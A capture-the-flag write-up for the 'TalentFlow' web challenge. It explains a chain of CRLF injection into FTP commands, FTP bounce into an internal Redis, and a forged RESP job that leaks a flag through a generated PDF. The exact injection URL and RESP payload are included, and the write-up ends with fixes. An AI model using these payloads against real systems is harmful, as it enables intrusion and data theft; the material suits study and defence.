# Web Chall 3

Author: `marlithor-cyber`

Challenge name: `TalentFlow`

## Summary

The application looks like a normal hiring portal, but the interesting path is the unauthenticated CV download endpoint:

- `web/handlers.go`
- `web/services/cv.go`
- `ftp/vsftpd.conf`
- `worker/main.py`

The final flag is not shown directly in the web UI. The exploit forces the worker to generate a PDF for applicant `id=1`, and the flag is inside that PDF in the `Full Name` field.

Flag:

```text
LB{78844f003b0dbe51b67791cc295bc815}
```

## Root Cause

This is a bug chain:

1. `handleCVDownload()` takes `/cv/<name>` and passes `<name>` straight into `cvSvc.Download()`.
2. `CVService.Download()` calls `conn.Retr(name)` with no validation.
3. Because the FTP filename is fully attacker-controlled, `%0d%0a` in the HTTP path becomes CRLF in the FTP command stream, so extra FTP commands can be injected.
4. The FTP server is configured with `port_promiscuous=YES` and `pasv_promiscuous=YES`, which makes FTP bounce practical.
5. The worker blindly trusts Redis jobs and will generate a PDF for any `user_id`, then upload it under attacker-controlled `cv_uuid`.

The seeded flag lives in PostgreSQL as applicant row `id=1`. When the worker renders a PDF for that row, the PDF includes:

- `ID: 1`
- `Full Name: LB{...}`
- `Email: admin@talentflow.local`

So the goal is to inject a fake Redis job for `user_id=1` and choose the output PDF name ourselves.

## Exploit

### 1. Upload any DOCX

Submitting a normal application returns a link like:

```text
/cv/<doc_uuid>.pdf
```

That means the uploaded source document is stored on FTP as:

```text
<doc_uuid>.docx
```

We use that filename later in the forged Redis job.

### 2. Upload a RESP payload

Create a file that is already a valid Redis protocol message:

```text
*3
$5
RPUSH
$4
jobs
$117
{"user_id":1,"filename":"<doc_uuid>.docx","cv_uuid":"11111111-1111-1111-1111-111111111111"}
```

Upload that as another application, for example `job.resp`. The app stores it on FTP and returns another UUID.

### 3. Bounce FTP into Redis

Now request the uploaded `.resp` file through `/cv/`, but inject extra FTP commands with CRLF:

```text
/cv/<resp_uuid>.resp%0d%0aEPRT%20|1|172.18.0.4|6379|%0d%0aRETR%20<resp_uuid>.resp
```

The resulting FTP command flow is effectively:

```text
RETR <resp_uuid>.resp
EPRT |1|172.18.0.4|6379|
RETR <resp_uuid>.resp
```

That makes vsftpd open the data connection to Redis and send the uploaded RESP payload there. Redis interprets it as:

```text
RPUSH jobs {"user_id":1,"filename":"<doc_uuid>.docx","cv_uuid":"11111111-1111-1111-1111-111111111111"}
```

### 4. Read the generated PDF

The worker consumes the fake job, loads applicant `id=1`, builds a PDF, and uploads it back to FTP as:

```text
11111111-1111-1111-1111-111111111111.pdf
```

Downloading that file and converting it to text reveals the flag in the PDF body:

```text
Applicant Report
[ CANDIDATE INFORMATION ]

ID
1

Full Name
LB{78844f003b0dbe51b67791cc295bc815}
```

## Notes

- The important point is that the flag is in the generated PDF, not in the initial HTTP responses.
- Local testing shows the same path with `LB{REDACTED}` for applicant `id=1`.
- Any fix must break the chain in multiple places: sanitize `/cv/` names, reject CRLF, disable FTP bounce behavior, and authenticate or sign Redis jobs.
